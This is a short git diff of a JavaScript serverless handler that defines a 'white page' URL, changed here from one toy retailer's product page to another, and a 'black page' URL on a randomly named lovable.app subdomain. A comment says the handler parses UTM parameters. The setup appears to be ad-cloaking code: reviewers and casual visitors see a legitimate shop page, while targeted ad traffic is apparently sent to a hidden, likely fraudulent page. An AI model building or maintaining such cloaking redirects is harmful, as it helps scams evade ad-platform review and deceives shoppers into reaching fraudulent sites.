@@ -1,6 +1,6 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://www.finenordic.com/maileg-unicorn-small.html";
+    const whitePageURL = "https://www.cogstoysandgames.ie/products/foosbots-2-pack";
     const blackPageURL = "https://wherlnquz.lovable.app/";
   
     // Parse the UTM parameters from the request URL
@@ -26,5 +26,6 @@ export default function handler(req, res) {
     res.end();
 
   }
+
 
 
